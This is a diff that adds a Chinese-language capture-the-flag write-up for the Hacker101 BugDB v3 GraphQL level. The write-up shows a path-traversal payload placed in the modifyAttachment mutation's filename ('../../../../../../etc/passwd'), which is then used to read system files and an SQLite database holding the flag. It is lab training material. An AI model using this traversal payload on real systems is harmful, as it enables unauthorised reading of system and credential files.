@@ -56,6 +56,79 @@ mutation {
 
 ### hackone101 BugDB v3
 
+常规的，将`query`方法列出
+
+![](../images/bugDB_v3_1.png)
+
+观察内省，发现多了两个`Mutation`的操作
+
+分别是上传文件和修改文件名称
+
+上传文件
+
+![](../images/bugDB_v3_2.png)
+
+得到的文件名是一串随即数
+
+```
+                          "node": {
+                            "id": "QXR0YWNobWVudHM6MQ==",
+                            "bugId": 1,
+                            "filename": "a13f22a17a0b6c38ec973e42dc80b608",
+                            "bug": {
+                              "id": "QnVnczox"
+                            }
+```
+
+修改文件名
+
+
+![](../images/bugDB_v3_3.png)
+
+修改文件名后得到的文件名成为可控值
+
+```
+                          "node": {
+                            "id": "QXR0YWNobWVudHM6MQ==",
+                            "bugId": 1,
+                            "filename": "test1.txt",
+                            "bug": {
+                              "id": "QnVnczox"
+                            }
+```
+
+到这里我就卡住了，然后参考了别人的wp
+
+首先hackerone给出的提示为
+
++ What new functionality was added?
++ Filenames are always interesting
++ How do you access attachments? Hint: not via GraphQL
+
+通过路由*/attachments/1*可以访问到之前上传的文件
+
+![](../images/bugDB_v3_4.png)
+
+事实上这有些类似我们的软连接的处理，在文件名中存在路径穿越的情况
+
+```
+mutation modifyAttachment{
+  modifyAttachment(id: 1, filename: "../../../../../../etc/passwd"){
+    ok
+  }
+}
+```
+
+当看了`main.py`和`model.py`的源码后，发现有这么一个东西
+
+```python
+from sqlalchemy import create_engine from sqlalchemy.ext.declarative import declarative_base from sqlalchemy.orm import relationship, scoped_session, sessionmaker from sqlalchemy import Column, DateTime, ForeignKey, Boolean, Integer, Text, func, String engine = create_engine('sqlite:///level18.db', convert_unicode=True) db_session = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine)) Base = declarative_base() Base.query = db_session.query_property() class User(Base): __tablename__ = 'users' id = Column(Integer, primary_key=True) username = Column(String(255)) password = Column(String(255)) bugs = relationship('Bug', primaryjoin='Bug.reporter_id==User.id') class Bug(Base): __tablename__ = 'bugs' id = Column(Integer, primary_key=True) reporter_id = Column(Integer, ForeignKey('users.id')) reporter = relationship(User, primaryjoin=reporter_id == User.id) text = Column(Text(65536)) private = Column(Boolean()) attachments = relationship('Attachment', primaryjoin='Attachment.bug_id==Bug.id') class Attachment(Base): __tablename__ = 'attachments' id = Column(Integer, primary_key=True) bug_id = Column(Integer, ForeignKey('bugs.id')) bug = relationship(Bug, primaryjoin=bug_id == Bug.id) filename = Column(String(255))
+```
+
+其中有个*sqlite:///level18.db*，用同样的方法，可以将flag读出
+
+![](../images/bugDB_v3_5.png)
+
 ## 漏洞报告
 
 ## template
